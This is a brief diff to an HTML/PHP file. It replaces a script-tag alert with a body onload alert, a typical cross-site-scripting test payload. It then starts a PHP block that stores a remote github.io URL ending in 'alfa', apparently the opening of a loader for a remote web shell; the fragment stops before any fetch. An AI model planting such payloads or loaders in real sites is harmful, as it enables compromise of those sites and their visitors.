@@ -1,5 +1,5 @@
 <!DOCTYPE html>
-<script>alert(".");</script>
+<body onload=alert(".")>
 </html>
 <?php
 $pff = "https://dfchkqp.github.io/alfa";
